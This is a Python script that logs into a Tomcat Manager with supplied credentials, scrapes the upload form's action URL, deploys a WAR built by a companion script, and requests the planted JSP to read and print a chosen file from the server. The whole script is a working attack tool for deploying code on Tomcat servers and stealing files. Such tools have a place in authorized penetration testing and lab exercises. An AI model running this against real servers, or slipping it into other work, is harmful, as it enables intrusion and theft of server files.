#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import pathlib
import re
import subprocess
import sys


def run(cmd: list[str]) -> str:
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if proc.returncode != 0:
        raise RuntimeError(f"command failed: {' '.join(cmd)}\nstdout={proc.stdout}\nstderr={proc.stderr}")
    return proc.stdout


def curl(base_args: list[str], *extra: str) -> str:
    return run(["curl", "-sS", *base_args, *extra])


def main() -> None:
    parser = argparse.ArgumentParser(description="Deploy a JSP WAR through Tomcat Manager HTML and read a file")
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--target-file", required=True)
    parser.add_argument("--artifact-dir", required=True)
    parser.add_argument("--app-name", default="readfile")
    parser.add_argument("--jsp-name", default="read.jsp")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    artifact_dir = pathlib.Path(args.artifact_dir).resolve()
    artifact_dir.mkdir(parents=True, exist_ok=True)
    jar = artifact_dir / "tomcat_cookie.jar"
    html_path = artifact_dir / "manager.html"
    war_path = artifact_dir / f"{args.app_name}.war"

    build_script = pathlib.Path(__file__).resolve().parent / "build_jsp_war.py"
    run(
        [
            sys.executable,
            str(build_script),
            "--out",
            str(war_path),
            "--target-file",
            args.target_file,
            "--jsp-name",
            args.jsp_name,
        ]
    )

    auth = f"{args.username}:{args.password}"
    html = curl(
        ["-u", auth, "-c", str(jar), "-b", str(jar)],
        f"{base_url}/manager/html",
    )
    html_path.write_text(html, encoding="utf-8")

    match = re.search(r'action="([^"]*/manager/html/upload[^"]+)"', html)
    if not match:
        raise RuntimeError("could not locate Tomcat upload action")
    action = match.group(1).replace("&amp;", "&")
    if action.startswith("//"):
        action_url = base_url + action[1:]
    elif action.startswith("/"):
        action_url = base_url + action
    else:
        action_url = base_url + "/" + action

    upload_resp = curl(
        ["-i", "-u", auth, "-c", str(jar), "-b", str(jar), "-F", f"deployWar=@{war_path}"],
        action_url,
    )
    (artifact_dir / "upload_response.txt").write_text(upload_resp, encoding="utf-8")

    jsp_url = f"{base_url}/{args.app_name}/{args.jsp_name}"
    body = curl([], jsp_url)
    (artifact_dir / "jsp_response.txt").write_text(body, encoding="utf-8")
    print(body)


if __name__ == "__main__":
    main()
